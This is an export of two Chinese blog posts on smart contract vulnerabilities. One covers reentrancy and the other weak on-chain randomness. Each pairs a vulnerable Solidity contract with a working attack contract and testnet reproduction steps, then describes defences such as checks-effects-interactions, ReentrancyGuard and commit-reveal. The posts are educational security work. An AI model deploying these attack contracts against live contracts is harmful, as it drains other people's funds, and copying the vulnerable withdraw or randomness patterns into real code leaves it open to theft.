[{"title":"智能合约重入漏洞","url":"/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/","content":"智能合约重⼊漏洞原理分析外部恶意合约回调了受攻击合约上的一个函数，并在受攻击合约上的任意位置“重新进入”代码执行。因为原合约的程序员可能没有预料到合约代码可以被”重入“，因此合约会出现不可预知的行为。在 gas 足够的情况下，合约之间甚至可以相互循环调用，直至达到 gas 的上限，但是如果循环中有转账之类的操作，就会导致严重的后果。\nfunction withdraw(uint _amount) public &#123;\trequire(balances[msg.sender] &gt;= _amount)\tmsg.sender.call.value(_amount)();\tbalances[msg.sender] -= _amount;&#125;\n\n\n其中，fallback函数是关键\nfallback函数当我们调用某个智能合约时，如果指定的函数找不到，或者根本就没指定调用哪个函数（如向合约发送 ether）时，fallback 函数就会被调用。\n向合约发送 send、transfer、call 消息时候都会调用 fallback 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 fallback 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 fallback 函数，这有可能导致循环调用。\n而fallback函数是可以被重写的\n如果构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）\n漏洞demopragma solidity ^0.6.10;contract Victim &#123;\tmapping(address =&gt; uint) public balances;\taddress public owner;        //构造函数，设定合约所有者    constructor() public &#123;        owner = msg.sender;    &#125;\t\t//接收资金转入\tfunction deposit() public payable &#123;\t\tbalances[msg.sender] += msg.value;\t&#125;\t\t//提款\tfunction withdraw(uint _amount) public &#123;\t\trequire(balances[msg.sender] &gt;= _amount);\t\tmsg.sender.call&#123;value: _amount&#125;(&quot;&quot;);\t\tbalances[msg.sender] -= _amount;\t&#125;\t\t//查询余额\tfunction getBalance() public view returns(uint) &#123;\t\treturn address(this).balance;\t&#125;&#125;\n\n攻击合约contract Attack &#123;\tVictim public victim;\t\t//设定受害者合约地址\tconstructor(address _victimAddress) public &#123;\t\tvictim = Victim(_victimAddress);\t&#125;\t\t//重写fallback\tfallback() external payable &#123;\t\tif(address(victim).balance &gt;= 1 ether)&#123;\t\t\tvictim.withdraw(1 ether);\t\t&#125;\t&#125;\t\t//攻击，调用受害者的withdraw函数\tfunction attack() external payable &#123;\t\trequire(msg.value &gt;= 1 ether);\t\tvictim.deposit&#123;value: 1 ether&#125;();\t\tvictim.withdraw(1 ether);\t&#125;\t\t//查询余额\tfunction getBalance() public view returns(uint) &#123;\t\treturn address(this).balance;\t&#125;&#125;\n\n复现过程虚拟机中\n分别为受害者和攻击者创建一个合约\n\n\n\n用deposit函数为受害者设定一定余额\n\n\n\n检查受害者余额\n\n\n\n进行攻击\n\n\n\n检查攻击者和受害者的余额\n\n\n\n测试链上\n部署受害者合约\n\n\n\n部署攻击者合约\n\n\n为受害者合约打入2eth\n\n\n\n\n攻击\n\n\n\n结果\n\n\n\n\n重入次数由于gas的限制，重入次数是有一定限制的\n调整参数，实验出最高重入次数\n可以在区块链浏览器上查询到重入的次数\n\n大约是9次\n注意，一旦 out of gas 就会攻击失败。\n规避建议方法一总是用 send()或transfer() 来发送 ether，而不是用 call.value()。因为transfer和send函数的gas仅有2300，这点gas仅够捕获一个event，所以将无法进行可重入攻击。\n方法二确保在执行外部调用之前已经更新了所有的内部状态，这一模式被称为：Checks-Effects-Interactions（“检查-生效-交互”）\n第一步，大多数函数会先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的以太币Ether ，用户是否具有token等等）。这些检查工作应该首先被完成。\n第二步，如果所有检查都通过了，接下来进行更改合约状态变量的操作。\n第三步，与其它合约的交互应该是任何函数的最后一步。\nrequire(balances[msg.sender] &gt; amount); //检查require(this.balance &gt; amount); //检查balances[msg.sender] -= amount; // 生效to.call.value(amount)();  // 交互\n\n方法三\n使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，可防止重入调用\n\nbool reEntrancyMutex = false;function withdraw(uint _amount) public &#123;\trequire(!reEntrancyMutex);\treEntrancyMutex = true;\trequire(balances[msg.sender] &gt;= _amount);\tmsg.sender.call&#123;value: _amount&#125;(&quot;&quot;);\tbalances[msg.sender] -= _amount;\treEntrancyMutex = false;&#125;\n\n\n使用OpenZeppelin官方的ReentrancyGuard合约的nonReentrant modifier。\n\n在函数中增加nonReentrant modifier可保证其不可重入，任何对该函数的重入操作都将以revert the call的方式来拒绝。\n当合约中有多个函数时，由于modifier的粒度在单个函数，若想完全避免重入，应对每个函数都添加nonReentrant modifier。否则，仍然可以通过其他函数来重入然后发起重入攻击，若该函数可能破坏不变量。\n// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.3.2 (security/ReentrancyGuard.sol)pragma solidity ^0.8.0;/** * @dev Contract module that helps prevent reentrant calls to a function. * * Inheriting from `ReentrancyGuard` will make the &#123;nonReentrant&#125; modifier * available, which can be applied to functions to make sure there are no nested * (reentrant) calls to them. * * Note that because there is a single `nonReentrant` guard, functions marked as * `nonReentrant` may not call one another. This can be worked around by making * those functions `private`, and then adding `external` `nonReentrant` entry * points to them. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. */abstract contract ReentrancyGuard &#123;    // Booleans are more expensive than uint256 or any type that takes up a full    // word because each write operation emits an extra SLOAD to first read the    // slot&#x27;s contents, replace the bits taken up by the boolean, and then write    // back. This is the compiler&#x27;s defense against contract upgrades and    // pointer aliasing, and it cannot be disabled.    // The values being non-zero value makes deployment a bit more expensive,    // but in exchange the refund on every call to nonReentrant will be lower in    // amount. Since refunds are capped to a percentage of the total    // transaction&#x27;s gas, it is best to keep them low in cases like this one, to    // increase the likelihood of the full refund coming into effect.    uint256 private constant _NOT_ENTERED = 1;    uint256 private constant _ENTERED = 2;    uint256 private _status;    constructor() &#123;        _status = _NOT_ENTERED;    &#125;    /**     * @dev Prevents a contract from calling itself, directly or indirectly.     * Calling a `nonReentrant` function from another `nonReentrant`     * function is not supported. It is possible to prevent this from happening     * by making the `nonReentrant` function external, and making it call a     * `private` function that does the actual work.     */    modifier nonReentrant() &#123;        // On the first call to nonReentrant, _notEntered will be true        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);        // Any calls to nonReentrant after this point will fail        _status = _ENTERED;        _;        // By storing the original value once again, a refund is triggered (see        // https://eips.ethereum.org/EIPS/eip-2200)        _status = _NOT_ENTERED;    &#125;&#125;\n\n\n使用采用pull payment模式，OpenZeppelin提供了PullPayment合约。\n\n其提供了_asyncTransfer函数，与transfer类似。然而，它不会将资金发送给接收者，而是将其转移到托管合约中。此外，PullPayment还为接收者提供了一个公共功能来提取（pull）他们的支付：withdrawPayments。\n// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.3.2 (security/PullPayment.sol)pragma solidity ^0.8.0;import &quot;../utils/escrow/Escrow.sol&quot;;/** * @dev Simple implementation of a * https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls[pull-payment] * strategy, where the paying contract doesn&#x27;t interact directly with the * receiver account, which must withdraw its payments itself. * * Pull-payments are often considered the best practice when it comes to sending * Ether, security-wise. It prevents recipients from blocking execution, and * eliminates reentrancy concerns. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. * * To use, derive from the `PullPayment` contract, and use &#123;_asyncTransfer&#125; * instead of Solidity&#x27;s `transfer` function. Payees can query their due * payments with &#123;payments&#125;, and retrieve them with &#123;withdrawPayments&#125;. */abstract contract PullPayment &#123;    Escrow private immutable _escrow;    constructor() &#123;        _escrow = new Escrow();    &#125;    /**     * @dev Withdraw accumulated payments, forwarding all gas to the recipient.     *     * Note that _any_ account can call this function, not just the `payee`.     * This means that contracts unaware of the `PullPayment` protocol can still     * receive funds this way, by having a separate account call     * &#123;withdrawPayments&#125;.     *     * WARNING: Forwarding all gas opens the door to reentrancy vulnerabilities.     * Make sure you trust the recipient, or are either following the     * checks-effects-interactions pattern or using &#123;ReentrancyGuard&#125;.     *     * @param payee Whose payments will be withdrawn.     */    function withdrawPayments(address payable payee) public virtual &#123;        _escrow.withdraw(payee);    &#125;    /**     * @dev Returns the payments owed to an address.     * @param dest The creditor&#x27;s address.     */    function payments(address dest) public view returns (uint256) &#123;        return _escrow.depositsOf(dest);    &#125;    /**     * @dev Called by the payer to store the sent amount as credit to be pulled.     * Funds sent in this way are stored in an intermediate &#123;Escrow&#125; contract, so     * there is no danger of them being spent before withdrawal.     *     * @param dest The destination address of the funds.     * @param amount The amount to transfer.     */    function _asyncTransfer(address dest, uint256 amount) internal virtual &#123;        _escrow.deposit&#123;value: amount&#125;(dest);    &#125;&#125;\n\n","tags":["智能合约","漏洞"]},{"title":"智能合约错误随机性","url":"/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/","content":"错误随机性智能合约开发中，在程序中使用随机数较好的伪随机数是很难的。很多看似无法被预言的随机数种子或变量，实际被预言的难度很低。\n核心问题：一旦在智能合约中使用了随机性很差的随机数作为关键变量，就面临着随机数被预言的攻击风险。\nPRNG相关漏洞类型开发者生成随机数时，一般都会使用伪随机数生成器(pseudo-random number generator)，简称 PRNG。而有漏洞的PRNG，一般有三种类型：\n\n\n使用区块变量作为熵源的 PRNG\n\n基于过往区块(和私有种子)的区块哈希的 PRNG\n\n易被抢占交易(front-running)的 PRNG\n\n\n\n使用区块变量作为熵源\nblock.coinbase 表示当前区块的矿工地址\nblock.difficulty 表示当前区块的挖掘难度\nblock.gaslimit 区块内交易的最大限制燃气消耗量\nblock.number 表示当前区块高度\nblock.timestamp 表示当前区块挖掘时间\n\n以上所有的区块变量都可以被矿工操纵，所以都不能用来做信息熵源。因为这些区块变量在同一区块上是共用的。攻击者通过其恶意合约调用受害者合约，那么此交易打包在同一区块中，其区块变量是一样的。\n基于过往区块的区块哈希每一个Ethereum区块链上的区块都有认证的hash值，通过 block.blockhash() 函数可以获取此值。此函数经常被错误地使用。\n\nblock.blockhash(block.number) ：基于当前区块的区块哈希\nblock.blockhash(block.number - 1) ： 基于负一区块的区块哈希\nBlockhash of a future block : 使用未来区块的区块哈希\nBlockhash with a private seed : 使用一个私有种子(seed)变量\n\n基于当前区块的区块哈希通过 block.number 变量可以获取当前区块区块高度。但是还没执行时，这个“当前区块”是一个未来区块，即只有当一个矿工拾取一个执行合约代码的交易时，这个未来区块才变为当前区块，所以合约才可以可靠地获取此区块的区块哈希。而一些合约曲解了block.blockhash(block.number) 的含义，误认为当前区块的区块哈希在运行过程中是已知的，并将之做为熵源。还有一点就是在以太坊虚拟机中(EVM)，区块哈希恒为 0。\n基于负一区块的区块哈希uint256 random = uint256(keccak256(block.blockhash(block.number - 1)));\n\n这样的方式，虽然理论上可以获得随机数，但这个随机数是不安全的。因为攻击者可以使用改造后的FullNode，让这笔交易可以在FullNode上执行，并获得结果后，再选择性广播那些可以符合攻击者期望的交易，即可以操纵交易的执行结果。\n攻击合约只要以相同代码执行，即可以产生到同样的伪随机数。\n使用未来区块的区块哈希第一笔交易触发合约，合约存储某个未来区块高度。\n第二笔交易，合约检索当前区块高度，如果超过了存储的未来区块高度，则通过区块哈希获得伪随机数结果。\n然而，这种方式也有它的局限性：在TVM中，blockhash被限定为只能获取近256个高度区块的数据，因此在以上的两笔交易间隔超过256 * 3s，大约12.8分钟后，这种方式就会失效。\n此方法只有在十分必要的时候才能使用。因为也存在一定危险性，EVM 能存储的区块哈希为最近的 256 条。超过的话值为 0。\n易被抢占交易(front-running)原理：更高的 gas 价格，交易将更快被矿工拾取打包。\n为了获取最大的奖励，矿工通过每个交易的 gas 累积值来选择并创建新的区块。而这些交易的排序是基于它们的 gas 价格。最高的 gas 价格会先被执行。由此通过操纵 gas 价格，可以将交易的顺序排在当前区块的前面。这就会引发抢占交易问题。\n复现前提Ganache CLI使用ethereumjs来模拟完整的客户端行为，使开发以太坊应用程序更快，更轻松，更安全。它还包括所有主流的RPC函数和功能（如event），并可以准确地运行以使开发变得容易。\n在后文的复现中，由于在remix中使用VM会报错，所以会使用ganache-cli来进行模拟。\nganache-cli是用Javascript编写的，并通过npm作为Node包进行分发。安装之前首先要确保安装了Node.js（&gt; = v6.11.5），可以使用node -v来检查自己的Node.js的版本\n安装\nnpm install -g ganache-cli\n\n\n启动\nganache-cli\n\n\n漏洞demopragma solidity ^0.6.10;contract GuessTheRandomNumber &#123;    constructor() public payable &#123;            &#125;        //s    function guess(uint guess) public &#123;        uint answer = uint(keccak256(abi.encodePacked(            blockhash(block.number - 1),            block.timestamp            )));                    if (guess == answer) &#123;            (bool sent, ) = msg.sender.call&#123;value: 1 ether&#125;(&quot;&quot;);            require(sent, &quot;Failed to send Ether&quot;);        &#125;    &#125;&#125;\n\n攻击合约pragma solidity ^0.6.10;contract Attack &#123;    fallback() external payable &#123;            &#125;        function attack(GuessTheRandomNumber guessTheRandomNumber) public &#123;        uint answer = uint(keccak256(abi.encodePacked(            blockhash(block.number - 1),            block.timestamp            )));                    guessTheRandomNumber.guess(answer);    &#125;        function getBalance() public view returns (uint) &#123;        return address(this).balance;    &#125;&#125;\n\n复现过程\n在remix中运行的时候选择Web3 Provider，注意这里的Web3 Provider Endpoint应匹配使用ganache-cli中的端口\n\n\n\n分别为攻击者和受害者创建智能合约\n\n\n\n输入受害者合约地址进行攻击后，即可看到猜测成功，余额增加\n\n\n较安全伪随机数的产生方法hash-commit-revealhash-commit-reveal被很多合约开发者视为随机数的最佳实践方案，已经被广泛应用于大量的DAPP中，这里我们来看看它的工作原理。\nhash-commit-reveal的本质，是合约调用者和随机数提供者（通常情况下是某外部预言机）在波场区块链平台上通过一系列协议来生成随机数。\nDice2Win采用混合模式, 巧妙地解决随机数弱, 且容易被预测的问题. 其整个流程如下:　　　　1. 玩家指定行动计划, 并生产对应的hash值.　　2. 服务端收到玩家的hash值, 产生随机值reveal, 然后根据reveal生产commit值, 把这个返回给玩家　　3. 玩家带着commit和行动信息, 在智能合约下真正下注　　4. 服务端发起结算, 带着真正的reveal值去结算　　中间的行动计划和reveal没法中途修改, 因为有hash值的验证　　其本质的思想是hash-commit-reveal, 其核心的思想是: 服务端不知道玩家的行为, 玩家不知道服务端真正的随机数. 而最终结果在合约里验证hash, 并给出预期的结果. 这样的流程, 保证玩家和服务端都满意。\n此类随机数生成策略的缺点也是很明显的：高度依赖于预言机（secretSigner）对合约的回调。因此，预言机有选择性回调的作恶风险。\nOraclizeOraclize定位为去中心化应用的数据搬运工，它作为Web APIs和DApp的可靠链接，有了Oraclize，就不需要建立额外的信任链，因为我们的行为已经被强制加密验证。\nOraclize 提供了一个连接以太坊与外部环境(互联网)的桥梁。通过 Oraclize，智能合约能够通过 web API 请求数据。如当前的兑换率，天气预报或股票价格。其中一个最大的作用是能提供伪随机数。一些合约通过 Oraclize 中的 URL 连接器来连接 random.org 来获取伪随机数。\nOraclize是一个可证明的诚实的预言机服务，可以让智能合约访问互联网，Oraclize是平台无关的，为所有主流的智能合约平台提供一种虚拟的接口，通过Oraclize投入大量有意义的数据到区块链中，可以使得智能合约产业更加繁荣，让更多有价值的应用呈现更大的生命力，Oraclize的使用方式可以参考下面的代码：\nhttps://github.com/oraclize/ethereum-examples/blob/master/solidity/random-datasource/randomExample.sol\n/*   Oraclize random-datasource example   This contract uses the random-datasource to securely generate off-chain N random bytes*/pragma solidity ^0.4.11;import &quot;github.com/oraclize/ethereum-api/oraclizeAPI.sol&quot;;contract RandomExample is usingOraclize &#123;        event newRandomNumber_bytes(bytes);    event newRandomNumber_uint(uint);         function RandomExample() &#123;        oraclize_setProof(proofType_Ledger); // sets the Ledger authenticity proof in the constructor        update(); // let&#x27;s ask for N random bytes immediately when the contract is created!    &#125;        // the callback function is called by Oraclize when the result is ready    // the oraclize_randomDS_proofVerify modifier prevents an invalid proof to execute this function code:    // the proof validity is fully verified on-chain    function __callback(bytes32 _queryId, string _result, bytes _proof)    &#123;         // if we reach this point successfully, it means that the attached authenticity proof has passed!        if (msg.sender != oraclize_cbAddress()) throw;                if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) &#123;            // the proof verification has failed, do we need to take any action here? (depends on the use case)        &#125; else &#123;            // the proof verification has passed            // now that we know that the random number was safely generated, let&#x27;s use it..                        newRandomNumber_bytes(bytes(_result)); // this is the resulting random number (bytes)                        // for simplicity of use, let&#x27;s also convert the random bytes to uint if we need            uint maxRange = 2**(8* 7); // this is the highest uint we want to get. It should never be greater than 2^(8*N), where N is the number of random bytes we had asked the datasource to return            uint randomNumber = uint(sha3(_result)) % maxRange; // this is an efficient way to get the uint out in the [0, maxRange] range                        newRandomNumber_uint(randomNumber); // this is the resulting random number (uint)        &#125;    &#125;        function update() payable &#123;         uint N = 7; // number of random bytes we want the datasource to return        uint delay = 0; // number of seconds to wait before the execution takes place        uint callbackGas = 200000; // amount of gas we want Oraclize to set for the callback function        bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas); // this function internally generates the correct oraclize_query and returns its queryId    &#125;&#125;\n\n考虑一个提供打赌的智能合约，用户调用打赌的接口，这个接口会把用户的请求存储起来，然后调用Oracle随机数生成服务，然后通过Oracle回调服务，判断随机数是否大于某个值，如果成立，那么用户成功，否则用户失败，这就是典型的Oracle的使用案例。\nRandaoRANDAO 机制就是，当用户通过储存（质押）32 ETH 成为验证者之后，该用户可以任意选定一个随机数。当需要为某个区块公布随机数时，将所有验证者的随机数加起来就可以得到一个全新的随机数。\nrandao是一个DAO(去中心化的匿名组织)允许任何人加入，随机数由所有参与者一起合作生成，首先我们需要在区块链上创建一个RANDAO的智能合约，合约定义了参与规则，然后生成随机数的基本过程可以分为下面三个步骤：\n第一步：收集有效的sha3(s)：参与随机数生成的参与者，首先需要在一个指定的时间区间(比如6个区块的区间，大约72秒)发送m ETH作为抵押到智能合约C，同时发送一个sha3(s)的值到智能合约C ，s是一个只有参与者自己知道的数字第二步:收集有效的s，在第一步结束后，那些提交了sha3(s)的参与者需要在指定的时间区间内发送s到智能合约C，智能合约C会检查sha3(s)和之前提交的值是否相同，相同的s会被保存到种子集合用来最终生成随机数。第三步:计算随机数并退回抵押和奖金，在所有的秘密数字s被成功收集后，智能合约C会使用函数f(s1,s2,…,sn)来计算随机数，随机数的结果会写入智能合约的存储，而且结果会被发送到所有之前请求随机数的其他智能合约上面，智能合约C会把第一阶段的抵押返回给参与者，然后奖金会被分成同等分发送给所有的参与者，奖金来源于请求随机值的其他智能合约。\nRNG补充规则：\n为了确保RNG不能被操控，以及为了安全和效率，智能合约C有以下的补充规则：\n在第一步中，如果有两个或更多个的同样的sha3(s)被提交上来，那么只有第一个会被接受在第一步中，对于参与者有最低要求，如果在指定时间区间内没有收集到足够多的sha3(s)的值，那么RNG在这个区块高度会失败如果参与者提交了sha3(s),那么他必须在第二步提交s如果参与者在第二步没有提交s，那么第一阶段提供的m ETH会被没收而且没有奖励如果一个或者多个s没有在第二步被提交，RNG在这个区块高度会失败，没收的ETH会被分成同等分发送给提交了s的其他参与者，其他申请随机数的其他合约的费用会被退回\nRNG激励机制：\nRNG的周期非常短，例如一个小时20个生成周期，如果没有周期的利润是0.001%,一个月的盈利会达到0.00001 * 20 * 24 * 30 = 0.144，为了达到14.4%每个月的盈利，并且RNG平均有n个参与者，运行智能合约C的费用为n * 3 * 500 * gasPrice + Ccost，CCost是合约内部的gas消费，包括计算和存储)假设每个随机值平均有r个请求，每个请求的费用是p ETH, 那么收入是r*p. 所以每个参与者每一次参与会收到rp - 1500n * gasPrice - Ccost)/n,当前的gasPrice是10 szabo, 合约的消费大概是1500n gas， 所以大概的净收入是(rp/n-0.03)ETH. 假设每个RNG有10个参与者，并且抵押是1000ETH，所以如果RNG如果只请求一次，那么一次的费用是0.4 ETH, 如果请求是10次，那么一次请求的价格会被降到0.04ETH\nRANDAO作为以太坊系统的基础设施，被其他的合约调用，不同的合约因为有不同的目的所以需要不同的随机值，有些需要高度加密的，比如说抽奖;有些需要稳定的回应，并且要求立即作出回应,这些合约本身的价值不高;有些需要回调函数，当随机值已经生成的时候需要接收到通知。\n但即使在这种情况下，最后一个公开随机数的人也可以在一定程度上操纵随机数。最后一个人可以选择保持沉默，以这样或那样的方式改变这个最终的随机数：房间里的最后一个人可以记住之前每个人公布的数字，如此一来，就可以知道加上（或者不加上）他提供的数字之后的最终随机数结果。如果相对于其他数字，某个数字对最后一个人更有利，那最后一个人就有动机去进行某种程度的操纵，不管程度高低。\n对于这一问题，以太坊 2.0 将通过 VDF（可验证延迟函数）来解决！\n……\n","tags":["智能合约","漏洞"]}]